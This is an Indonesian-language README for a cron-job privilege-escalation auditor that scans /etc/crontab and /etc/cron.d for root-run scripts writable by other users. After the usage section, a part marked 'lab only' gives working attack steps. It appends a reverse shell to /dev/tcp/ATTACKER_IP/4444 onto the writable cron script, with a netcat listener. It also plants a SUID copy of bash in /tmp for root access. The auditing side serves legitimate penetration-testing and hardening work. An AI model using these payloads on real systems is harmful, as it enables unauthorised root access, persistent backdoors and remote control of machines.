
# 🕵️ CRON ROOT HUNTER

Tool sederhana untuk mendeteksi potensi **Privilege Escalation via Cron Job** akibat file/script yang dijalankan oleh root tetapi writable oleh user lain.

---

## 🚀 Usage

Jalankan tool:

```bash
python3 cron_root_audit.py
```

Atau jadikan executable:

```bash
chmod +x cron_root_audit.py
./cron_root_audit.py
```

---

## 🔍 Auto Scan Target

Tool akan otomatis melakukan scanning terhadap:

- `/etc/crontab`
- `/etc/cron.d/*`

---

## 📊 Output Indicator

- 🔴 **[CRITICAL]** → Privilege Escalation possible  
- 🟡 **[WARNING]** → Konfigurasi mencurigakan  
- 🟢 **[SAFE]** → Tidak ditemukan celah  

---

## 🔎 Contoh Output Vulnerable

Jika muncul:

```text
/opt/app/backup.sh
Owner: root
Perm : 775
[CRITICAL] File writable by non-root!
```

Lanjut cek manual:

```bash
ls -l /opt/app/backup.sh
id
```

Kalau:

- Owner = root  
- Permission = 775 atau 777  
- Group sama dengan user lo (misalnya www-data)  

Berarti bisa di‑exploit.

---

# 💣 Exploit Flow (Lab Only)

> ⚠ Gunakan hanya di lab / authorized environment.

---

## 1️⃣ Reverse Shell Method

### Di attacker machine:

```bash
nc -lvnp 4444
```

### Di target (low privilege user):

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/app/backup.sh
```

Tunggu cron jalan.

Kalau berhasil → dapet root shell.

---

## 2️⃣ SUID Backdoor Method

Tambahkan payload:

```bash
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/app/backup.sh
```

Tunggu cron jalan.

Lalu:

```bash
/tmp/rootbash -p
id
```

Kalau output:

```text
uid=0(root)
```

Root access confirmed.

---

## 🧪 Quick Verification

Cek cron job jalan tiap berapa menit:

```bash
cat /etc/crontab
cat /etc/cron.d/*
```

Cek group lo:

```bash
id
```

---

## ⚠ Notes

- Pastikan script yang dijalankan cron benar‑benar writable.
- Pastikan cron berjalan sebagai root.
- Gunakan hanya untuk tujuan edukasi dan authorized penetration testing.
- Selalu restore kondisi sistem setelah lab selesai.
